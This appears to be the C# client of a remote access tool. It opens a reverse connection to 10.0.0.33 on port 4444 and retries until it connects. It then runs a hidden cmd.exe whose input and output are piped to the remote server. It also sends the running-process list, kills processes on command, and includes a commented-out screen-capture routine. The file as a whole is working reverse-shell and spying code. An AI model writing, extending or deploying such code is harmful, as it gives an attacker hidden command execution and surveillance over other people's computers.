using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Management;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
namespace Client1
{
    internal class Program
    {
        private static Process cmdProcess;
        private static StreamWriter toShell;
        private static StreamReader fromShell;
        private static StreamReader error;
        private static string output = "";
        private static StreamWriter writer = null;
        static void Main()
        {
            string serverIP = "10.0.0.33"; // Replace with your server's IP address
            int port = 4444;
            TcpClient client = null;
            NetworkStream stream = null;
            StreamReader reader = null;

            while (true)
            {
                try
                {
                    client = new TcpClient(serverIP, port);
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                    break;
                }
                catch (Exception ex)
                {
                    Console.Clear();
                    Console.WriteLine("Waiting To Connect...");
                    Thread.Sleep(500);
                    Console.Clear();
                    Console.WriteLine("Waiting To Connect..");
                    Thread.Sleep(500);
                    Console.Clear();
                    Console.WriteLine("Waiting To Connect.");
                    Thread.Sleep(500);
                    Console.Clear();
                    Console.WriteLine("Waiting To Connect");
                    Thread.Sleep(500);
                }
            }

            while (true)
            {
                string serverResponse = reader.ReadLine();
                if (serverResponse != null)
                {
                    if (serverResponse == "cmd-start")
                    {
                        StartCmd();
                        Console.WriteLine("cmd-start received");
                    }
                    else if (serverResponse == "cmd-stop")
                    {
                        StopCmd();
                        Console.WriteLine("cmd-stop received");
                    }
                    else if (serverResponse == "task-manager-data")
                    {
                        SendTaskManagerData(writer);
                    }
                    else if (serverResponse == "kill-process")
                    {
                        serverResponse = reader.ReadLine();
                       ExecuteCommand("taskkill /F /IM " + serverResponse);
                    }


                    else
                    {
                        if (serverResponse.StartsWith("command"))
                        {
                            
                            string command = serverResponse.Substring("command".Length).Trim();
                            SendCommandToCmd(command);

                        }
                    }


                }
            }
        }

        static void StartCmd()
        {
            ProcessStartInfo info = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            cmdProcess = new Process { StartInfo = info };
            cmdProcess.Start();
            toShell = cmdProcess.StandardInput;
            fromShell = cmdProcess.StandardOutput;
            error = cmdProcess.StandardError;
            toShell.AutoFlush = true;

            GetShellOutput();
        }

        static void StopCmd()
        {
            if (cmdProcess != null && !cmdProcess.HasExited)
            {
                cmdProcess.Kill();
                toShell.Dispose();
                fromShell.Dispose();
                error.Dispose();
                cmdProcess.Dispose();
                cmdProcess = null;
                toShell = null;
                fromShell = null;
                error = null;
            }
        }

        private static void SendCommandToCmd(string command)
        {
            if (cmdProcess != null && !cmdProcess.HasExited)
            {
                toShell.WriteLine(command);
            }
        }
        private static void SendCommandToServer(string command)
        {
            writer.Write(command);
            writer.Flush();
        }
        private static void GetShellOutput()
        {
            Task.Factory.StartNew(() =>
            {
                try
                {
                    string outputBuffer = "";

                    while ((outputBuffer = fromShell.ReadLine()) != null)
                    {
                        SendCommandToServer(outputBuffer + "\n");
                    }
                }
                catch (Exception ex)
                {
                    SendCommandToCmd("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    //SendCommandToCmd(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

            Task.Factory.StartNew(() =>
            {
                try
                {
                    string errorBuffer = "";

                    while ((errorBuffer = error.ReadLine()) != null)
                    {
                        SendCommandToServer(errorBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommandToCmd("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    //ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

        }
        static void SendTaskManagerData(StreamWriter writer)
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process"))
            {
                foreach (ManagementObject process in searcher.Get())
                {
                    string name = $"{process["Name"]}";
                    string path = process["ExecutablePath"]?.ToString() ?? "null";

                    writer.WriteLine(name);
                    writer.WriteLine(path);
                }
            }

            writer.WriteLine("END_OF_DATA");
            writer.Flush();
        }
        static string ExecuteCommand(string command)
        {
            try
            {
                // Execute command and capture its output
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe")
                {
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                };

                using (Process process = new Process() { StartInfo = psi })
                {
                    process.Start();
                    process.StandardInput.WriteLine(command);
                    process.StandardInput.Flush();
                    process.StandardInput.Close();
                    return process.StandardOutput.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                return "Error executing command: " + ex.Message;
            }
        }
        //public static string CaptureScreenToBase64()
        //{
        //    // תפיסת תמונת המסך
        //    Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
        //                                      Screen.PrimaryScreen.Bounds.Height,
        //                                      PixelFormat.Format32bppArgb);
        //    Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
        //    gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
        //                                 Screen.PrimaryScreen.Bounds.Y,
        //                                 0,
        //                                 0,
        //                                 Screen.PrimaryScreen.Bounds.Size,
        //                                 CopyPixelOperation.SourceCopy);

        //    // שמירת תמונת המסך לזרם זיכרון
        //    using (MemoryStream memoryStream = new MemoryStream())
        //    {
        //        bmpScreenshot.Save(memoryStream, ImageFormat.Png);
        //        byte[] imageBytes = memoryStream.ToArray();

        //        // המרת התמונה למחרוזת base64
        //        string base64String = Convert.ToBase64String(imageBytes);
        //        return base64String;
        //    }
        //}




    }
}
